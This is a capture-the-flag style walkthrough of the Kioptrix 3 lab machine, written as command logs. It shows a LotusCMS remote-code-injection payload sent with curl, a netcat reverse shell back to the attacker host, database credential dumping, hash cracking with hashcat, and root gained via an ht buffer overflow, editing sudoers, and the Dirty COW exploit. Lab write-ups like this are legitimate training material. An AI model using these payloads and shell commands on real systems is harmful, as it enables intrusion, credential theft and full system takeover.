# Table of contents

- [Recon](#recon)
  - [TCP/80 - HTTP](#tcp80---http)
    - [FFUF](#ffuf)
- [Initial Foothold](#initial-foothold)
  - [TCP/80 - HTTP - Louts CMS Exploit](#tcp80---http---louts-cms-exploit)
- [Privilege Escalation](#privilege-escalation)
  - [Loneferret - Via Creds Found](#loneferret---via-creds-found)
  - [Root - Via Buffer Overflow](#root---via-buffer-overflow)
  - [Root - Via Sudo](#root---via-sudo)
- [Privilege Escalation to Root - 3 via Kernel Exploit](#privilege-escalation-to-root---3-via-kernel-exploit)

# Recon
## TCP/80 - HTTP
### FFUF
```
┌──(root💀kali)-[~/vulnHub/kioptrix3]
└─# ffuf -u http://192.168.1.107/FUZZ -w /usr/share/wordlists/dirb/common.txt -e ".php,.html,.txt" -fw 24

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.1.107/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .php .html .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 24
________________________________________________

                        [Status: 200, Size: 1819, Words: 167, Lines: 39]
cache                   [Status: 301, Size: 353, Words: 23, Lines: 10]
core                    [Status: 301, Size: 352, Words: 23, Lines: 10]
favicon.ico             [Status: 200, Size: 23126, Words: 13, Lines: 6]
gallery                 [Status: 301, Size: 355, Words: 23, Lines: 10]
index.php               [Status: 200, Size: 1819, Words: 167, Lines: 39]
index.php               [Status: 200, Size: 1819, Words: 167, Lines: 39]
modules                 [Status: 301, Size: 355, Words: 23, Lines: 10]
phpmyadmin              [Status: 301, Size: 358, Words: 23, Lines: 10]
style                   [Status: 301, Size: 353, Words: 23, Lines: 10]
update.php              [Status: 200, Size: 18, Words: 2, Lines: 1]
:: Progress: [18460/18460] :: Job [1/1] :: 15386 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```
- `phpmyadmin`
- `update.php`


# Initial Foothold
## TCP/80 - HTTP - Louts CMS Exploit
1. View enumerated directories
	- `update.php`
		- Permission Denied
	- `phpmyadmin`
		![](images/Pasted%20image%2020220123184431.png)
	- `index.php`
		![](images/Pasted%20image%2020220123184511.png)
2. Proceed to login
	![](images/Pasted%20image%2020220123184550.png)
	- LotusCMS
3. Search for LotusCMS Exploits
	- [Reference](https://github.com/Hood3dRob1n/LotusCMS-Exploit/blob/master/lotusRCE.sh)
4. Manual Exploit
	1. Payload
		```
		curl http://192.168.1.107/index.php --data "page=index');${system('COMMAND TO EXECUTE')};#"
		```
	2. URL Encoded Payload
		```
		curl http://192.168.1.107/index.php --data "page=index%27%29%3B%24%7Bsystem%28%27COMMAND TO EXECUTE%27%29%7D%3B%23%22
		```
		![](images/Pasted%20image%2020220123190400.png)
	3. URL Encode "COMMAND TO EXECUTE"
		```
		┌──(root💀kali)-[~/vulnHub/kioptrix3/192.168.1.95]
		└─# hURL --URL "echo -n Vulnerability Found"
		Original    :: echo -n Vulnerability Found
		URL ENcoded :: echo%20-n%20Vulnerability%20Found
		```
	4. Check if target is susceptible 
		```
		┌──(root💀kali)-[~/vulnHub/kioptrix3/192.168.1.95]
		└─# curl http://192.168.1.107/index.php --data "page=index%27%29%3B%24%7Bsystem%28%27echo%20-n%20Vulnerability%20Found%27%29%7D%3B%23%22" | grep -ioP "vulnerability found"
		  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
										 Dload  Upload   Total   Spent    Left  Speed
		100  1926    0  1838  100    88   802k  39338 --:--:-- --:--:-- --:--:--  940k
		Vulnerability Found
		```
	5. Execute Reverse Shell
		```
		curl http://192.168.1.107/index.php --data "page=index%27%29%3B%24%7Bsystem%28%27nc+192.168.1.1+4444+-e+/bin/bash%27%29%7D%3B%23%22
		```
	6. Obtained www-data shell
		```
		┌──(root💀kali)-[~/vulnHub/kioptrix3/192.168.1.95/exploit2]
		└─# nc -nvlp 4444
		Ncat: Version 7.92 ( https://nmap.org/ncat )
		Ncat: Listening on :::4444
		Ncat: Listening on 0.0.0.0:4444
		Ncat: Connection from 192.168.1.107.
		Ncat: Connection from 192.168.1.107:59717.
		whoami
		www-data
		```
		![](images/Pasted%20image%2020220123191806.png)
	
# Privilege Escalation
## Loneferret - Via Creds Found
1. Look for SQL Credentials
	```
	www-data@Kioptrix3:/home/www/kioptrix3.com$ grep -Rnw $(pwd)/* -ie "connect" --color=always 2>/dev/null
	
	/home/www/kioptrix3.com/core/lib/RemoteFiles.php:91:	   // connect to the remote server
	/home/www/kioptrix3.com/gallery/gheader.php:25:    // Connect to MySQL
	/home/www/kioptrix3.com/gallery/install.BAK:96:        // Try to connect to the database
	/home/www/kioptrix3.com/gallery/themes/black/stats.php:49://Connect to local host to check URL data
	/home/www/kioptrix3.com/gallery/themes/black/stats.php:75:        $db = MYSQL_CONNECT($host,$user, $pass) OR DIE("Unable to connect to database"); 
	/home/www/kioptrix3.com/gallery/themes/black/stats.php:132://Connect to remote host to get initial URL data if there is no local data
	/home/www/kioptrix3.com/gallery/themes/black/stats.php:138:    $db = MYSQL_CONNECT($host,$user, $pass) OR DIE("Unable to connect to database"); 
	```
2. View `stats.php`
	![](images/Pasted%20image%2020220123192954.png)
	```
	www-data@Kioptrix3:/home/www/kioptrix3.com$ mysql -u lancore_gallarif -p
	Enter password: 
	ERROR 1045 (28000): Access denied for user 'lancore_gallarif'@'localhost' (using password: YES)
	```
	- Not the database we are looking for
3. View `gheader.php`
	![](images/Pasted%20image%2020220123193128.png)
	- `/gfunctions.php`
	- `/gconfig.php`
4. Find configuration files
	```
	www-data@Kioptrix3:/home/www/kioptrix3.com$ find $(pwd) 2> /dev/null | grep "gfunctions\|gconfig"   
	/home/www/kioptrix3.com/gallery/gfunctions.php
	/home/www/kioptrix3.com/gallery/BACK/gfunctions.php.bak
	/home/www/kioptrix3.com/gallery/gconfig.php
	```
5. View `gconfig.php`
	![](images/Pasted%20image%2020220123193414.png)
	- root:fuckeyou
6. Access mysql to obtain more creds
	```
	www-data@Kioptrix3:/home/www/kioptrix3.com$ mysql -u lancore_gallarif -p
	Enter password: 
	ERROR 1045 (28000): Access denied for user 'lancore_gallarif'@'localhost' (using password: YES)
	www-data@Kioptrix3:/home/www/kioptrix3.com$ mysql -u root -p
	Enter password: 
	Welcome to the MySQL monitor.  Commands end with ; or \g.
	Your MySQL connection id is 15
	Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

	Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

	mysql> show databases;
	+--------------------+
	| Database           |
	+--------------------+
	| information_schema | 
	| gallery            | 
	| mysql              | 
	+--------------------+
	3 rows in set (0.00 sec)

	mysql> use gallery
	Reading table information for completion of table and column names
	You can turn off this feature to get a quicker startup with -A

	Database changed
	mysql> show tables;
	+----------------------+
	| Tables_in_gallery    |
	+----------------------+
	| dev_accounts         | 
	| gallarific_comments  | 
	| gallarific_galleries | 
	| gallarific_photos    | 
	| gallarific_settings  | 
	| gallarific_stats     | 
	| gallarific_users     | 
	+----------------------+
	7 rows in set (0.00 sec)
	
	mysql> select * from dev_accounts;
	+----+------------+----------------------------------+
	| id | username   | password                         |
	+----+------------+----------------------------------+
	|  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 |  # MD5 Hash
	|  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e | 
	+----+------------+----------------------------------+
	2 rows in set (0.00 sec)
	```
7. Crack hash
	```
	┌──(root💀kali)-[~/vulnHub/kioptrix3/192.168.1.95/exploit]
	└─# hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt  --show
	0d3eccfb887aabd50f243b3f155c0f85:Mast3r
	5badcaf789d3d1d09794d8f021f40f0e:starwars
	```
	- dreg:Mast3r
	- loneferret:starwars
8. Switch to loneferret
	![](images/Pasted%20image%2020220123194519.png)

	
## Root - Via Buffer Overflow 
1. Check sudo access
	```
	loneferret@Kioptrix3:~$ sudo -l
	sudo -l
	User loneferret may run the following commands on this host:
		(root) NOPASSWD: !/usr/bin/su
		(root) NOPASSWD: /usr/local/bin/ht
	loneferret@Kioptrix3:~$ 
	```
2. Run `ht`
	```
	loneferret@Kioptrix3:~$ sudo ht
	sudo ht
	Error opening terminal: unknown.
	loneferret@Kioptrix3:~$ export TERM=xterm
	```
	![](images/Pasted%20image%2020220123195137.png)
	- `ht 2.0.18`
3. Search for exploits
	- https://www.exploit-database.net/?id=17836
	- A bufferoverflow exploit where EIP is overwritten into spawning a shell
4. Transfer exploit 
5. Exploit
	```
	python exploit.py > output
	sudo ht $(cat output)
	```
	![](images/Pasted%20image%2020220123195449.png)

## Root - Via Sudo
1. Edit `/etc/sudoers` w/ ht editor
	```
	export TERM=xterm
	sudo ht
	ALT + F > Open > /etc/sudoers
	Replace !/usr/bin/su w/ /bin/su
	ALT + F > Save > Quit
	```
	![](images/Pasted%20image%2020220123195917.png)
	![](images/Pasted%20image%2020220123200009.png)
2. Obtain root
	```
	loneferret@Kioptrix3:/home/www/kioptrix3.com$ sudo su
	root@Kioptrix3:/home/www/kioptrix3.com# whoami
	root
	root@Kioptrix3:/home/www/kioptrix3.com# 
	```
	![](images/Pasted%20image%2020220123200230.png)
	
# Privilege Escalation to Root - 3 via Kernel Exploit
1. Ran linpeas
	![](images/kioptrix%20linpeas%20output.png)
2. Search exploits for `linux version 2.6.24`
	- https://www.exploit-db.com/exploits/40839
3. Transfer exploit
4. Compile & Exploit
	```
	loneferret@Kioptrix3:/tmp$ nc 192.168.1.1 4444 > dirty.c
	loneferret@Kioptrix3:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
	dirty.c:193:2: warning: no newline at end of file
	loneferret@Kioptrix3:/tmp$ chmod +x dirty; ./dirty 
	/etc/passwd successfully backed up to /tmp/passwd.bak
	Please enter the new password: 
	Complete line:
	firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash

	mmap: b7fe0000
	CTRL + C

	loneferret@Kioptrix3:/tmp$ su firefart
	Password: 
	firefart@Kioptrix3:/tmp# cd /root
	firefart@Kioptrix3:~# whoami
	firefart
	firefart@Kioptrix3:~# id
	uid=0(firefart) gid=0(root) groups=0(root)
	firefart@Kioptrix3:~# 
	```
	![](images/Pasted%20image%2020220123200759.png)
5. Obtain Root Flag
	![](images/Pasted%20image%2020220123200831.png)
	
---
Tags: #tcp/80-http/web-app-cms-exploit #tcp/80-http/rce  #linux-priv-esc/linux-creds-found #linux-priv-esc/vulnerable-bin #linux-priv-esc/kernel-exploit 


---
